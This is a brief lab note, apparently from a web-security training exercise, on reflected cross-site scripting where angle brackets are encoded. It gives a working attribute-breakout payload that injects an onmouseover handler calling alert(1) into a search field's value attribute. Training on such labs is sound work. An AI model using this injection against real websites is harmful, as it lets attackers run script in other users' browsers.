Lab #7 - Reflected XSS into attribute with angle brackets HTML-encoded

Target Goal - Exploit reflected XSS vulnerability to call the alert function

Analysis:

name=search value="" onmouseover="alert(1)">

" onmouseover="alert(1)
